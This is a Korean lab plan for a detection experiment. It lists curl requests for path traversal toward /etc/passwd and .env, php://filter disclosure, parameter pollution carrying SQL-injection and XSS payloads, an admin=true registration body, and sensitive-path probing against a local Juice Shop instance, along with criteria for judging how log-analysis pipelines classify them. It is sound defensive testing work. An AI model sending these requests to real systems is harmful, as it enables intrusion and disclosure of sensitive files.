# 98B_D세트_비교실험

- 작성 기준일: 2026-04-25
- 문서 역할: `docs/98_비교_실험_요청_세트_표준.md`를 따르는 D세트 비교 실험 초안
- 적용 범위: Path Traversal / HPP / Directory Probing
- 기준 데이터: Apache security/access/error 로그 표면 지표
- 주요 대상: Juice Shop 중심, OpenCart는 보조/선택
- 실험 목적:
  1. Path Traversal 계열 요청에서 raw path, URL encoding, path normalization, 민감 파일 접근 의도를 보수적으로 식별한다.
  2. HTTP Parameter Pollution(HPP)에서 동일 파라미터 중복 전달과 공격 payload 결합 여부를 구분한다.
  3. Directory Probing에서 민감 경로 탐색과 단시간 반복 404/403 요청을 probing 정황으로 묶어낼 수 있는지 확인한다.

> 주의: 이 문서는 실행 문서 초안이다. 모든 요청은 승인된 로컬/실험 환경에서만 수행한다. Apache 로그만으로는 실제 파일 내용 반환, 파일 읽기 성공, 권한 상승 성공, 애플리케이션 내부 파라미터 처리 결과를 확정하지 않는다.

## 1. 기본 변수 및 환경

| 항목 | 값 |
|---|---|
| 주 대상 서비스 | Juice Shop |
| 보조 대상 서비스 | OpenCart, 선택 |
| 기본 URL | `http://192.168.56.105` |
| UA prefix | `lab-d-set` |
| 실험 방식 | CLI-only, `curl` 기준 |
| 주요 분석 로그 | Apache `security` log |

예시 변수:

```bash
export JUICE_URL="http://192.168.56.105"
export OPENCART_URL="http://192.168.56.105"
export UA_PREFIX="lab-d-set"
```

실제 URL은 환경에 맞게 조정한다.

### 1.1 분석 축

| 분석 축 | 설명 |
|---|---|
| Traversal Reconstruction | `../`, `%2e%2e%2f`, double encoding, raw_request_target 기반 path 의도 복원 |
| Path Normalization Safety | Apache/전처리 과정에서 path 의미가 사라지지 않았는지 확인 |
| Sensitive File Intent | `/etc/passwd`, `.env`, `win.ini`, config 파일 접근 의도 식별 |
| HPP Context Preservation | 동일 파라미터 반복과 뒤쪽 payload를 HPP 문맥으로 보존하는지 확인 |
| Directory Probing | 민감 경로, 관리자 경로, 반복 404/403 요청을 probing 정황으로 묶는지 확인 |
| False Positive Control | 정상 중복 파라미터 또는 단발 404를 과도하게 incident로 올리지 않는지 확인 |

### 1.2 Apache 로그 기반 한계

직접 확인 가능한 것:

- `raw_request`, `raw_request_target`, `uri`, `query_string`
- `status_code`, `response_body_bytes`, `resp_content_type`
- `duration_us`, `ttfb_us`
- `src_ip`, `user_agent`, `request_id`, `error_link_id`
- `path_normalized_from_raw_request`
- `hpp_detected`, `hpp_param_names`

직접 확인할 수 없는 것:

- response body 원문
- 실제 파일 내용 반환 여부
- `/etc/passwd`의 `root:x:0:0` 반환 여부
- `.env` 내용 노출 여부
- 애플리케이션 내부 file read 결과
- POST body 내부 파라미터 전체 내용
- 서버 측에서 첫 번째/마지막 HPP 파라미터 중 무엇을 사용했는지

보고서 표현 원칙:

- 가능: “Traversal payload가 raw_request_target에 관찰됨”
- 가능: “민감 파일 접근 의도가 관찰됨”
- 가능: “HPP 문맥에서 SQLi/XSS payload가 결합됨”
- 가능: “단시간 directory probing 정황”
- 불가: “파일 읽기 성공 확정”
- 불가: “/etc/passwd 내용 유출 확정”
- 불가: “HPP로 권한 상승 성공 확정”

## 2. Round 1 — Path Traversal

Round 1은 traversal 계열 요청을 Apache 로그 표면에서 얼마나 보수적으로 해석하는지 확인한다.

### 2.1 D-01 Basic Traversal — `/etc/passwd` intent

```bash
curl -i --path-as-is \
  -A "${UA_PREFIX}-trav-basic-passwd-1" \
  "$JUICE_URL/public/images/../../../../etc/passwd"
```

기대 관찰:

- `raw_request_target`에 `../` 또는 이에 준하는 traversal 구조가 남는지 확인
- `uri`가 정규화되더라도 `raw_request_target` 기준으로 판단
- `/etc/passwd` 접근 의도는 high-signal traversal 시도로 기록
- 실제 `/etc/passwd` 내용 반환은 Apache 로그만으로 확정하지 않음

### 2.2 D-02 Null Byte Suffix Bypass

```bash
curl -i --path-as-is \
  -A "${UA_PREFIX}-trav-nullbyte-passwd-1" \
  "$JUICE_URL/public/images/../../../../etc/passwd%00.pdf"
```

기대 관찰:

- `%00` 또는 null byte suffix를 필터 우회 의도로 설명하는지 확인
- `.pdf` suffix가 있더라도 `/etc/passwd` 접근 의도가 유지되는지 확인
- 최신 환경에서는 null byte가 실제로 동작하지 않을 수 있으므로 성공 단정 금지

### 2.3 D-03 URL Encoded Traversal — `.env` intent

```bash
curl -i --path-as-is \
  -A "${UA_PREFIX}-trav-urlenc-env-1" \
  "$JUICE_URL/public/images/%2e%2e%2f%2e%2e%2f%2e%2e%2f.env"
```

기대 관찰:

- `%2e%2e%2f`를 `../` 의미로 복원하는지 확인
- `.env` 접근 의도를 민감 설정 파일 접근 시도로 해석하는지 확인
- raw path와 decoded view를 함께 근거로 사용

### 2.4 D-04 Absolute Path Access

```bash
curl -i --path-as-is \
  -A "${UA_PREFIX}-trav-absolute-passwd-1" \
  "$JUICE_URL/etc/passwd"
```

기대 관찰:

- `/etc/passwd` 직접 접근 의도를 탐지
- traversal dot segment는 없더라도 sensitive file access intent로 기록
- 실제 파일 read 성공은 별도 body 검증 없이는 단정하지 않음

### 2.5 D-05 OpenCart/PHP Wrapper Optional

Juice Shop에는 맞지 않을 수 있으므로 OpenCart/PHP 환경에서만 선택 실행한다.

```bash
curl -i -G \
  -A "${UA_PREFIX}-trav-php-wrapper-1" \
  --data-urlencode "route=product/product" \
  --data-urlencode "path=php://filter/convert.base64-encode/resource=index.php" \
  "$OPENCART_URL/index.php"
```

기대 관찰:

- `php://filter`를 PHP wrapper 기반 file disclosure intent로 인식
- OpenCart/PHP 환경 전용 기법임을 명시
- Juice Shop 결과와 직접 동일 기준으로 비교하지 않음

## 3. Round 2 — HTTP Parameter Pollution

Round 2는 동일 이름 파라미터 반복과 공격 payload 결합 여부를 확인한다.

### 3.1 D-11 Benign Duplicate Parameter

```bash
curl -i -G \
  -A "${UA_PREFIX}-hpp-benign-dup-1" \
  --data-urlencode "q=apple" \
  --data-urlencode "q=banana" \
  "$JUICE_URL/rest/products/search"
```

기대 관찰:

- `hpp_detected=true`
- `hpp_param_names`에 `q` 포함
- 공격 payload가 없으면 `suspicious_hpp`로 과승격하지 않고 low 또는 context로 처리

### 3.2 D-12 HPP + SQLi Payload

```bash
curl -i -G \
  -A "${UA_PREFIX}-hpp-sqli-tail-1" \
  --data-urlencode "q=apple" \
  --data-urlencode "q=x')) OR 1=1 --" \
  "$JUICE_URL/rest/products/search"
```

기대 관찰:

- `hpp_detected=true`
- `hpp_param_names`에 `q` 포함
- HPP 자체와 SQLi payload를 분리하지 않고 “HPP를 이용한 SQLi 시도”로 설명
- 실제 서버가 어떤 `q` 값을 사용했는지는 Apache 로그만으로 확정하지 않음

### 3.3 D-13 HPP + XSS Payload

```bash
curl -i -G \
  -A "${UA_PREFIX}-hpp-xss-tail-1" \
  --data-urlencode "q=apple" \
  --data-urlencode "q=<script>alert(1)</script>" \
  "$JUICE_URL/rest/products/search"
```

기대 관찰:

- `hpp_detected=true`
- `q` 중복 전달 확인
- “HPP를 이용한 XSS 시도”로 설명
- 브라우저 실행 성공은 단정하지 않음

### 3.4 D-14 POST Body HPP Optional

현재 baseline은 raw POST body 원문을 LLM 입력으로 사용하지 않는다. 이 실험은 핵심 검증이 아니라 한계 확인용이다.

```bash
curl -i \
  -A "${UA_PREFIX}-hpp-post-body-1" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "email=a@example.invalid&admin=true&email=b@example.invalid" \
  "$JUICE_URL/rest/user/register"
```

기대 관찰:

- Apache 로그상 `req_content_type`, `req_content_length`, method, uri, status 정도만 확인 가능
- body 내부 `admin=true`, 중복 `email`은 현재 baseline만으로 직접 보이지 않음
- Stage2는 POST body visibility 한계로 보수적으로 정리해야 함

## 4. Round 3 — Directory Probing

Round 3은 민감 경로 접근과 단시간 반복 probing을 확인한다.

### 4.1 D-21 Sensitive File / Repo Probe

```bash
curl -i --path-as-is \
  -A "${UA_PREFIX}-probe-git-config-1" \
  "$JUICE_URL/.git/config"

curl -i --path-as-is \
  -A "${UA_PREFIX}-probe-env-1" \
  "$JUICE_URL/.env"
```

기대 관찰:

- `.git/config`, `.env` 접근 시도를 directory probing 또는 sensitive file probing으로 기록
- 403/404라도 probing intent는 유지
- 실제 파일 내용 노출은 단정하지 않음

### 4.2 D-22 Admin Path Guessing

```bash
curl -i --path-as-is \
  -A "${UA_PREFIX}-probe-admin-1" \
  "$JUICE_URL/admin"

curl -i --path-as-is \
  -A "${UA_PREFIX}-probe-administrator-1" \
  "$JUICE_URL/administrator"
```

기대 관찰:

- 단발이면 low-signal probing
- 같은 src_ip에서 민감 파일 probe 또는 traversal과 근접하면 campaign context로 설명
- 단순 404 하나를 high severity incident로 올리지 않음

### 4.3 D-23 Short-burst 404 Probe

```bash
for path in \
  "/backup" \
  "/backups" \
  "/config" \
  "/server-status" \
  "/phpmyadmin" \
  "/manager/html"; do
  curl -i --path-as-is \
    -A "${UA_PREFIX}-probe-burst-1" \
    "$JUICE_URL${path}"
  sleep 1
done
```

기대 관찰:

- 개별 요청은 low-signal일 수 있음
- 같은 src_ip, 짧은 시간, 민감 경로 사전 기반 접근이면 directory probing burst로 요약
- Stage2에서 후보 밖 탐색성 요청 또는 probing summary로 묶는지 확인

## 5. 실행 순서

1. 시작 시각 기록
2. D-01~D-04 Path Traversal 실행
3. 필요 시 D-05 OpenCart/PHP wrapper 실행
4. 20~30초 cooldown
5. D-11 benign HPP 실행
6. D-12 HPP + SQLi 실행
7. D-13 HPP + XSS 실행
8. 필요 시 D-14 POST body HPP 실행
9. 20~30초 cooldown
10. D-21 sensitive file/repo probe 실행
11. D-22 admin path guessing 실행
12. D-23 short-burst probe 실행
13. 종료 시각 기록
14. 시간 구간 export
15. provider별 pipeline 실행
16. 비교 문서 작성

각 요청 사이에는 1~3초 간격을 둔다. D-23 burst는 의도적으로 짧은 간격을 유지한다.

## 6. 평가 기준

### 6.1 Path Traversal 평가

| 항목 | 성공 기준 | 보수적 해석 |
|---|---|---|
| Basic traversal | `raw_request_target`에 `../` 또는 encoded traversal이 보존됨 | 파일 읽기 성공은 response body 없이는 미확정 |
| Encoded traversal | `%2e%2e%2f` 등을 traversal로 복원 | decode depth와 원본 보존을 함께 기록 |
| Sensitive file intent | `/etc/passwd`, `.env`, `win.ini`, config 파일 접근 의도 탐지 | 실제 내용 노출 확정 금지 |
| Null byte suffix | `%00` + suffix 우회 의도 식별 | 현대 환경에서 실제 우회 성공은 별도 검증 필요 |
| PHP wrapper | `php://filter` 의도 식별 | PHP/OpenCart 환경 한정으로 해석 |

### 6.2 HPP 평가

| 항목 | 성공 기준 | 보수적 해석 |
|---|---|---|
| Duplicate parameter | 동일 파라미터 반복 감지 | 공격 payload 없으면 low/context |
| HPP + SQLi | 중복 파라미터와 SQLi payload 결합을 함께 설명 | 서버가 어느 값을 사용했는지 단정 금지 |
| HPP + XSS | 중복 파라미터와 XSS payload 결합을 함께 설명 | 브라우저 실행 성공 단정 금지 |
| POST body HPP | visibility 한계 설명 | raw POST body 없이 HPP 성공/실패 판단 금지 |

### 6.3 Directory Probing 평가

| 항목 | 성공 기준 | 보수적 해석 |
|---|---|---|
| Sensitive path probe | `.git`, `.env`, config류 접근 시도 식별 | 403/404라도 probing intent 가능 |
| Admin path guess | `/admin`, `/administrator` 접근 시도 식별 | 단발 high severity 금지 |
| Burst probing | 같은 src_ip, 짧은 시간, 여러 민감 경로 접근을 묶음 | 개별 요청보다 sequence 중심으로 해석 |

## 7. 권장 Verdict / 보고 표현

| 구분 | 판단 기준 | 권장 표현 |
|---|---|---|
| Traversal 시도 | traversal payload 또는 민감 파일 path가 raw_request_target에 관찰됨 | `suspicious_traversal` |
| Traversal 성공 가능성 | status 200 + body 검증에서 민감 파일 내용 확인 | `malicious_traversal`, 단 Apache 로그만으로는 사용 금지 |
| Encoded traversal | URL-encoded traversal 복원 가능 | `suspicious_traversal_evasion` |
| HPP 관찰 | 동일 이름 파라미터 2회 이상 | `hpp_observed` 또는 context |
| HPP + SQLi/XSS | 중복 파라미터와 공격 payload 결합 | `suspicious_hpp_sqli` / `suspicious_hpp_xss` |
| Directory probing | 민감 경로 또는 반복 404/403 burst | `suspicious_probing` |
| Low-signal 단발 probe | 단발 `/admin` 등 | `low_signal_dir_probe` 또는 context |
| POST body HPP | body visibility 부족 | `insufficient_data_post_body` |

## 8. Provider 비교 포인트

| 비교 항목 | 확인 내용 |
|---|---|
| Traversal 보수성 | `200` 응답만으로 파일 읽기 성공을 단정하지 않는지 |

| Probing sequence | 단발 404와 burst probing을 구분하는지 |
| known asset 고려 | 내부 테스트 IP일 경우 위험도 표현을 보수화하는지 |

## 10. 후속 코드 개선 검토 항목

이번 문서는 실행 초안이며 코드 수정 지시 문서가 아니다. D세트 결과에 따라 다음을 검토할 수 있다.

1. encoded traversal decode depth 2 이상 hint 강화
   - `traversal:encoded_dotdot_slash`
   - `traversal:double_decoded_path`

2. sensitive file intent hint 세분화
   - `traversal:etc_passwd_intent`
   - `traversal:env_file_intent`
   - `traversal:php_wrapper_filter`

3. HPP + attack coupling hint 강화
   - `hpp:duplicate_param:q`
   - `hpp:sqli_tail_payload`
   - `hpp:xss_tail_payload`

4. Probing sequence summary 강화
   - same src_ip + short time window + sensitive path dictionary 기반 grouping
   - `low_signal_dir_probe`를 Stage2의 “후보 밖 탐색성 요청” 섹션에 명확히 표시

5. POST body visibility 한계 유지
   - raw POST body를 baseline으로 사용하지 않는 한 HPP 성공 단정 금지

---

## 11. 안전 및 해석 유의사항

- 모든 요청은 승인된 로컬/실험 환경에서만 수행한다.
- 외부 시스템을 대상으로 실행하지 않는다.
- `--path-as-is`를 사용해 raw traversal intent가 Apache 로그에 남도록 한다.
- 실제 민감 파일 내용 확인은 public repo에 올리지 않는다.
- response body 원문이 없는 현재 baseline에서는 파일 읽기 성공을 확정하지 않는다.
- POST body 내부 payload는 현재 baseline에서 직접 확인되지 않는다는 점을 반드시 기록한다.
- OpenCart/PHP wrapper 실험은 PHP 기반 보조 환경에서만 수행한다.

## 13. 발표용 한 줄 정리

D세트는 Path Traversal, HPP, Directory Probing을 대상으로 raw_request_target 보존, encoded traversal 복원, HPP context preservation, probing burst grouping을 검증하는 실험이다. Apache 로그 기준으로는 민감 파일 접근 의도와 파라미터 변조 시도는 관찰할 수 있지만, 실제 파일 내용 유출이나 HPP 처리 성공은 response body/application evidence 없이는 확정하지 않는다.
